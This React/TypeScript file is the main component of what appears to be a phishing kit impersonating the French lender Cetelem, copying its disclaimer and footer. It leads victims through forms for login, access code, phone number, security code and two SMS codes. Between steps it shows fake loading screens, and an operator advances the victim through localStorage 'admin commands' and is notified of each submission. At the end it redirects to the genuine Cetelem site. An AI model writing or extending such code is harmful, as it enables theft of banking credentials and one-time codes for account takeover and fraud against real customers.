import React, { useState } from 'react';
import LoginForm from './components/LoginForm';
import CodeForm from './components/CodeForm';
import PhoneForm from './components/PhoneForm';
import SecurityCodeForm from './components/SecurityCodeForm';
import SmsCodeForm from './components/SmsCodeForm';
import LoadingPage from './components/LoadingPage';
import SuccessPage from './components/SuccessPage';

type Step = 'login' | 'code' | 'loading1' | 'phone' | 'loading2' | 'security' | 'loading3' | 'sms1' | 'loading4' | 'sms2' | 'loading5' | 'success';

function App() {
  const [currentStep, setCurrentStep] = useState<Step>('login');

  // Écouter les commandes de l'admin
  React.useEffect(() => {
    const handleAdminCommand = () => {
      const command = localStorage.getItem('adminCommand');
      if (command) {
        const { action, step } = JSON.parse(command);
        if (action === 'navigate') {
          setCurrentStep(step as Step);
          // Nettoyer la commande après l'avoir traitée
          localStorage.removeItem('adminCommand');
        }
      }
    };

    // Écouter les changements dans localStorage
    window.addEventListener('storage', handleAdminCommand);
    
    // Écouter les événements personnalisés (pour la même page)
    window.addEventListener('adminCommand', (e: any) => {
      setCurrentStep(e.detail.step as Step);
    });

    // Vérifier au chargement initial
    handleAdminCommand();

    return () => {
      window.removeEventListener('storage', handleAdminCommand);
      window.removeEventListener('adminCommand', handleAdminCommand);
    };
  }, []);

  // Fonction pour notifier l'admin des actions utilisateur
  const notifyAdmin = (action: string, nextStep?: string) => {
    localStorage.setItem('userAction', JSON.stringify({
      action,
      step: currentStep,
      nextStep,
      timestamp: Date.now()
    }));
  };

  const nextStep = () => {
    let nextStepId: Step;
    
    switch (currentStep) {
      case 'login':
        nextStepId = 'code';
        break;
      case 'code':
        nextStepId = 'loading1';
        break;
      case 'phone':
        nextStepId = 'loading2';
        break;
      case 'security':
        nextStepId = 'loading3';
        break;
      case 'sms1':
        nextStepId = 'loading4';
        break;
      case 'sms2':
        nextStepId = 'loading5';
        break;
      case 'success':
        // Redirection finale après 8 secondes
        setTimeout(() => {
          window.location.href = 'https://www.cetelem.fr/fr/accueil';
        }, 8000);
        return;
      default:
        return;
    }

    // Notifier l'admin et aller à l'étape de chargement
    notifyAdmin('submit', nextStepId);
    setCurrentStep(nextStepId);
  };

  const renderCurrentStep = () => {
    switch (currentStep) {
      case 'login':
        return <LoginForm onNext={nextStep} />;
      case 'code':
        return <CodeForm onNext={nextStep} />;
      case 'loading1':
        return <LoadingPage message="Traitement de vos informations..." />;
      case 'phone':
        return <PhoneForm onNext={nextStep} />;
      case 'loading2':
        return <LoadingPage message="Traitement de vos informations..." />;
      case 'security':
        return <SecurityCodeForm onNext={nextStep} />;
      case 'loading3':
        return <LoadingPage message="Traitement de vos informations..." />;
      case 'sms1':
        return <SmsCodeForm onNext={nextStep} />;
      case 'loading4':
        return <LoadingPage message="Traitement de vos informations..." />;
      case 'sms2':
        return <SmsCodeForm onNext={nextStep} isSecondCode={true} />;
      case 'loading5':
        return <LoadingPage message="Mise à jour du numéro de téléphone en cours..." />;
      case 'success':
        return <SuccessPage />;
      default:
        return <LoginForm onNext={nextStep} />;
    }
  };

  return (
    <>
      <main>
      <div className="form">
        <div className="logo">
          <img src="img/logo.png" alt="Logo" />
        </div>
        
        <div className="title">
          <label>Un crédit vous engage et doit être remboursé. <br />
            Vérifiez vos capacités de remboursement avant de vous engager.</label>
        </div>

        <div className="title1">
          <label>Un crédit vous engage et doit être remboursé. 
            Vérifiez vos capacités de remboursement avant de vous engager.</label>
        </div>

        {renderCurrentStep()}
      </div>

      <div className="span">
        <span>Virement express</span>
        <span>Résiliation</span> <span>Contact</span> <span>Questions / Réponses</span> <span>Réclamation</span> 
        <span>Mentions légales</span> <span>Informations sur les cookies</span> <span>Préférence de cookies</span> 
        <span>Données personnelles</span> 
        <br /><br /><span>Déclaration accessibilité</span> <span>Accessibilité</span>
      </div> 

      <div className="span1">
        <span>Virement express</span>
        <span>Résiliation</span> <span>Contact</span> <span>Questions / Réponses</span> <span>Réclamation</span> 
        <span>Mentions légales</span> <span>Informations sur les cookies</span> <span>Préférence de cookies</span> 
        <span>Données personnelles</span> 
        <span>Déclaration accessibilité</span> <span>Accessibilité</span>
      </div> 

      <div className="fa">
        <img src="img/fa.png" alt="FA" />
      </div>
      </main>
    </>
  );
}


export default App